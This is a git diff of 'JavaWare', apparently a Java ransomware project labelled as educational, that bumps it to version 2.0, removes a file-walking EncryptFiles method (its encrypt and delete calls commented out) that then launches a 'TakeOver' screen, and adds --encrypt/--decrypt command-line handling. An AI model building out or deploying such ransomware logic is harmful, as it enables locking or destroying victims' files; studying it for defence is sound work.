@@ -9,7 +9,7 @@
 
  Copyright (c) 2019 Kyra Mozley
  Created on 18/07/19
- Version 1.0
+ Version 2.0
 
  Disclaimer: This project is purely for educational purposes
  DO NOT RUN THIS ON YOUR PERSONAL MACHINE
@@ -38,42 +38,12 @@ public class JavaWare {
         avoidDir = new AvoidedDir().avoidDir;
     }
 
-    public void EncryptFiles() throws Exception{
-        FindFiles ff = new FindFiles();
-        ff.FindFiles();
-
-        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "directory.txt"));
-        String line = reader.readLine();
-
-        while(line != null) {
-            File directory = new File(line);
-            File[] files = directory.listFiles();
-
-            for(File f: files) {
-               if(f.isFile()) {
-                   int index = f.getName().lastIndexOf(".");
-                   String fileType = f.getName().substring(index + 1);
-
-                   //if file extension is allowed, encrypt file
-                   FileTypes FileTypes = new FileTypes();
-                   if(FileTypes.AllowedTypes.contains("." + fileType.toUpperCase())) {
-                       //aes.encrypt(f);
-                       //f.delete();
-                       System.out.println("Encrypting "+ f);
-                   }
-               }
-
-            }
-            //read next line
-            line = reader.readLine();
-        }
-        reader.close();
-        Application.launch(TakeOver.class, "JavaWare");
-    }
 
     public void DecryptFiles() throws Exception {
         String home = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "Documents";
+        System.out.println("Decrypting");
         decryptionTraversal(home);
+
     }
 
     public void decryptionTraversal(String path) throws Exception {
@@ -100,8 +70,21 @@ public class JavaWare {
 
     public static void main(String[] args) throws Exception {
         JavaWare jw = new JavaWare();
-        //jw.EncryptFiles();
-        Scheduler s = new Scheduler();
-        s.function();
+
+        if(args.length == 0) {
+            //assume encrypt
+            FindFiles ff = new FindFiles();
+            ff.FindFiles();
+        } else if(args.length == 1) {
+            if(args[0].equals("--encrypt")) {
+                FindFiles ff = new FindFiles();
+                ff.FindFiles();
+            } else if(args[0].equals("--decrypt")) {
+                jw.DecryptFiles();
+            } else {
+                System.out.println("Incorrect input, enter --encrypt to encrypt filesystem, or --decrypt to decrypt system.");
+            }
+        }
+
     }
 }
